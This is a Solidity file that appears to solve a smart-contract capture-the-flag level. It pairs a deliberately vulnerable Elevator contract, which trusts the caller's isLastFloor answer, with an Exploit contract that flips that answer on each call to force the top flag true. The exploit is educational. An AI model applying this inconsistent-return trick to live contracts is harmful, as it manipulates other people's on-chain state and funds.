// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Exploit {
    Elevator elevator;
    bool top = true;
    constructor(address challenge) public {
        elevator = Elevator(challenge);
    }
    function isLastFloor(uint) public returns (bool) {
        top = !top;  // 调用一次就改一次返回值
        return top;
    }
    function exp() public {
        elevator.goTo(1);
    }
}